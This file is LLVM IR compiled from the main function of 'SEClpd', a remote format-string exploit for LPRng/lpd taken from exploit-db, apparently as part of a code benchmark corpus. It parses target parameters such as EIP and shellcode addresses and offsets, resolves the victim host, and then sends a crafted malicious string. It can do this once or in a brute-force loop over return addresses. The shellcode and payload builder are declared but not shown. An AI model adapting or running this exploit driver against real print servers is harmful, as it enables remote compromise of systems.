; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_227.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_227.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i32, i32, i32, i8*, i8* }

@hostname = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [6 x i8] c"brute\00", align 1
@brute = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [16 x i8] c"t:r:c:a:o:p:w:k\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@type = common dso_local global i64 0, align 8
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@offset = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [26 x i8] c"You must specify a type!\0A\00", align 1
@.str.3 = private unnamed_addr constant [31 x i8] c"example: ./SEClpd victim -t 0\0A\00", align 1
@he = common dso_local global i32* null, align 8
@.str.4 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@SHELLCODE_COUNT = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [56 x i8] c"+++ Security.is remote exploit for LPRng/lpd by DiGiT\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [25 x i8] c"+++ Exploit information\0A\00", align 1
@.str.7 = private unnamed_addr constant [16 x i8] c"+++ Victim: %s\0A\00", align 1
@.str.8 = private unnamed_addr constant [19 x i8] c"+++ Type: %d - %s\0A\00", align 1
@.str.9 = private unnamed_addr constant [23 x i8] c"+++ Eip address: 0x%x\0A\00", align 1
@.str.10 = private unnamed_addr constant [29 x i8] c"+++ Shellcode address: 0x%x\0A\00", align 1
@.str.11 = private unnamed_addr constant [18 x i8] c"+++ Position: %d\0A\00", align 1
@.str.12 = private unnamed_addr constant [19 x i8] c"+++ Alignment: %d\0A\00", align 1
@.str.13 = private unnamed_addr constant [15 x i8] c"+++ Offset %d\0A\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.15 = private unnamed_addr constant [41 x i8] c"+++ Attacking %s with our format string\0A\00", align 1
@.str.16 = private unnamed_addr constant [50 x i8] c"+++ Brute force man, relax and enjoy the ride ;>\0A\00", align 1
@failure = common dso_local global i64 0, align 8
@address_buffer = common dso_local global i32 0, align 4
@OFFSET_LIMIT = common dso_local global i32 0, align 4
@.str.17 = private unnamed_addr constant [44 x i8] c"+++ Offset limit hit, ending brute mode ;<\0A\00", align 1
@.str.18 = private unnamed_addr constant [42 x i8] c"Argh exploit failed$#%! try brute force!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [1024 x i8], align 16
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %7, align 8
  store i32 0, i32* %9, align 4
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %10, 3
  br i1 %11, label %12, label %17

12:                                               ; preds = %2
  %13 = load i8**, i8*** %5, align 8
  %14 = getelementptr inbounds i8*, i8** %13, i64 0
  %15 = load i8*, i8** %14, align 8
  %16 = call i32 @usage(i8* %15)
  store i32 1, i32* %3, align 4
  br label %208

17:                                               ; preds = %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 1
  %20 = load i8*, i8** %19, align 8
  store i8* %20, i8** @hostname, align 8
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 2
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 @strncmp(i8* %23, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0), i32 5)
  %25 = icmp ne i32 %24, 0
  br i1 %25, label %27, label %26

26:                                               ; preds = %17
  store i32 1, i32* @brute, align 4
  br label %27

27:                                               ; preds = %26, %17
  br label %28

28:                                               ; preds = %88, %27
  %29 = load i32, i32* %4, align 4
  %30 = load i8**, i8*** %5, align 8
  %31 = call i32 @getopt(i32 %29, i8** %30, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0))
  store i32 %31, i32* %8, align 4
  %32 = load i32, i32* @EOF, align 4
  %33 = icmp ne i32 %31, %32
  br i1 %33, label %34, label %89

34:                                               ; preds = %28
  %35 = load i32, i32* %8, align 4
  switch i32 %35, label %83 [
    i32 116, label %36
    i32 114, label %40
    i32 99, label %48
    i32 97, label %56
    i32 111, label %64
    i32 112, label %68
    i32 119, label %76
  ]

36:                                               ; preds = %34
  %37 = load i32, i32* @optarg, align 4
  %38 = call i8* @atoi(i32 %37)
  %39 = ptrtoint i8* %38 to i64
  store i64 %39, i64* @type, align 8
  br label %88

40:                                               ; preds = %34
  %41 = load i32, i32* @optarg, align 4
  %42 = call i8* @strtoul(i32 %41, i32* null, i32 16)
  %43 = ptrtoint i8* %42 to i32
  %44 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %45 = load i64, i64* @type, align 8
  %46 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %44, i64 %45
  %47 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %46, i32 0, i32 0
  store i32 %43, i32* %47, align 8
  br label %88

48:                                               ; preds = %34
  %49 = load i32, i32* @optarg, align 4
  %50 = call i8* @strtoul(i32 %49, i32* null, i32 16)
  %51 = ptrtoint i8* %50 to i32
  %52 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %53 = load i64, i64* @type, align 8
  %54 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %52, i64 %53
  %55 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %54, i32 0, i32 1
  store i32 %51, i32* %55, align 4
  br label %88

56:                                               ; preds = %34
  %57 = load i32, i32* @optarg, align 4
  %58 = call i8* @atoi(i32 %57)
  %59 = ptrtoint i8* %58 to i32
  %60 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %61 = load i64, i64* @type, align 8
  %62 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %60, i64 %61
  %63 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %62, i32 0, i32 2
  store i32 %59, i32* %63, align 8
  br label %88

64:                                               ; preds = %34
  %65 = load i32, i32* @optarg, align 4
  %66 = call i8* @atoi(i32 %65)
  %67 = ptrtoint i8* %66 to i32
  store i32 %67, i32* @offset, align 4
  br label %88

68:                                               ; preds = %34
  %69 = load i32, i32* @optarg, align 4
  %70 = call i8* @atoi(i32 %69)
  %71 = ptrtoint i8* %70 to i32
  %72 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %73 = load i64, i64* @type, align 8
  %74 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %72, i64 %73
  %75 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %74, i32 0, i32 3
  store i32 %71, i32* %75, align 4
  br label %88

76:                                               ; preds = %34
  %77 = load i32, i32* @optarg, align 4
  %78 = call i8* @atoi(i32 %77)
  %79 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %80 = load i64, i64* @type, align 8
  %81 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %79, i64 %80
  %82 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %81, i32 0, i32 5
  store i8* %78, i8** %82, align 8
  br label %88

83:                                               ; preds = %34
  %84 = load i8**, i8*** %5, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 0
  %86 = load i8*, i8** %85, align 8
  %87 = call i32 @usage(i8* %86)
  store i32 1, i32* %3, align 4
  br label %208

88:                                               ; preds = %76, %68, %64, %56, %48, %40, %36
  br label %28

89:                                               ; preds = %28
  %90 = load i64, i64* @type, align 8
  %91 = icmp ult i64 %90, 0
  br i1 %91, label %92, label %95

92:                                               ; preds = %89
  %93 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0))
  %94 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %208

95:                                               ; preds = %89
  %96 = load i8*, i8** @hostname, align 8
  %97 = call i32* @gethostbyname(i8* %96)
  store i32* %97, i32** @he, align 8
  %98 = icmp eq i32* %97, null
  br i1 %98, label %99, label %102

99:                                               ; preds = %95
  %100 = call i32 @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0))
  %101 = call i32 @exit(i32 1) #3
  unreachable

102:                                              ; preds = %95
  %103 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %104 = load i64, i64* @type, align 8
  %105 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %103, i64 %104
  %106 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 8
  %108 = load i32, i32* @SHELLCODE_COUNT, align 4
  %109 = add nsw i32 %107, %108
  %110 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %111 = load i64, i64* @type, align 8
  %112 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %110, i64 %111
  %113 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %112, i32 0, i32 1
  store i32 %109, i32* %113, align 4
  %114 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.5, i64 0, i64 0))
  %115 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.6, i64 0, i64 0))
  %116 = load i8*, i8** @hostname, align 8
  %117 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.7, i64 0, i64 0), i8* %116)
  %118 = load i64, i64* @type, align 8
  %119 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %120 = load i64, i64* @type, align 8
  %121 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %119, i64 %120
  %122 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %121, i32 0, i32 4
  %123 = load i8*, i8** %122, align 8
  %124 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.8, i64 0, i64 0), i64 %118, i8* %123)
  %125 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %126 = load i64, i64* @type, align 8
  %127 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %125, i64 %126
  %128 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %127, i32 0, i32 0
  %129 = load i32, i32* %128, align 8
  %130 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.9, i64 0, i64 0), i32 %129)
  %131 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %132 = load i64, i64* @type, align 8
  %133 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %131, i64 %132
  %134 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %133, i32 0, i32 1
  %135 = load i32, i32* %134, align 4
  %136 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.10, i64 0, i64 0), i32 %135)
  %137 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %138 = load i64, i64* @type, align 8
  %139 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %137, i64 %138
  %140 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %139, i32 0, i32 3
  %141 = load i32, i32* %140, align 4
  %142 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.11, i64 0, i64 0), i32 %141)
  %143 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %144 = load i64, i64* @type, align 8
  %145 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %143, i64 %144
  %146 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %145, i32 0, i32 2
  %147 = load i32, i32* %146, align 8
  %148 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.12, i64 0, i64 0), i32 %147)
  %149 = load i32, i32* @offset, align 4
  %150 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.13, i64 0, i64 0), i32 %149)
  %151 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i64 0, i64 0))
  %152 = load i8*, i8** @hostname, align 8
  %153 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.15, i64 0, i64 0), i8* %152)
  %154 = load i32, i32* @brute, align 4
  %155 = icmp sgt i32 %154, 0
  br i1 %155, label %156, label %194

156:                                              ; preds = %102
  %157 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.16, i64 0, i64 0))
  %158 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %159 = load i64, i64* @type, align 8
  %160 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %158, i64 %159
  %161 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %160, i32 0, i32 0
  store i32 -1073741840, i32* %161, align 8
  br label %162

162:                                              ; preds = %192, %156
  %163 = load i64, i64* @failure, align 8
  %164 = icmp ne i64 %163, 0
  br i1 %164, label %165, label %193

165:                                              ; preds = %162
  %166 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %167 = call i32 @memset(i8* %166, i8 signext 0, i32 1024)
  %168 = call i8* (...) @create_malicious_string()
  store i8* %168, i8** %7, align 8
  %169 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %170 = load i32, i32* @address_buffer, align 4
  %171 = call i32 @strcpy(i8* %169, i32 %170)
  %172 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %173 = load i8*, i8** %7, align 8
  %174 = call i32 @strcat(i8* %172, i8* %173)
  %175 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %176 = call i32 @strcat(i8* %175, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i64 0, i64 0))
  %177 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %178 = call i32 @send_code(i8* %177)
  %179 = load i32, i32* @offset, align 4
  %180 = sub i32 -1073741840, %179
  %181 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %182 = load i64, i64* @type, align 8
  %183 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %181, i64 %182
  %184 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %183, i32 0, i32 0
  store i32 %180, i32* %184, align 8
  %185 = load i32, i32* @offset, align 4
  %186 = add nsw i32 %185, 4
  store i32 %186, i32* @offset, align 4
  %187 = load i32, i32* @offset, align 4
  %188 = load i32, i32* @OFFSET_LIMIT, align 4
  %189 = icmp sgt i32 %187, %188
  br i1 %189, label %190, label %192

190:                                              ; preds = %165
  %191 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.17, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %208

192:                                              ; preds = %165
  br label %162

193:                                              ; preds = %162
  br label %196

194:                                              ; preds = %102
  %195 = call i8* (...) @create_malicious_string()
  store i8* %195, i8** %7, align 8
  br label %196

196:                                              ; preds = %194, %193
  %197 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %198 = load i32, i32* @address_buffer, align 4
  %199 = call i32 @strcpy(i8* %197, i32 %198)
  %200 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %201 = load i8*, i8** %7, align 8
  %202 = call i32 @strcat(i8* %200, i8* %201)
  %203 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %204 = call i32 @strcat(i8* %203, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i64 0, i64 0))
  %205 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %206 = call i32 @send_code(i8* %205)
  %207 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.18, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %208

208:                                              ; preds = %196, %190, %92, %83, %12
  %209 = load i32, i32* %3, align 4
  ret i32 %209
}

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @strncmp(i8*, i8*, i32) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i8* @atoi(i32) #1

declare dso_local i8* @strtoul(i32, i32*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32* @gethostbyname(i8*) #1

declare dso_local i32 @herror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i8* @create_malicious_string(...) #1

declare dso_local i32 @strcpy(i8*, i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @send_code(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
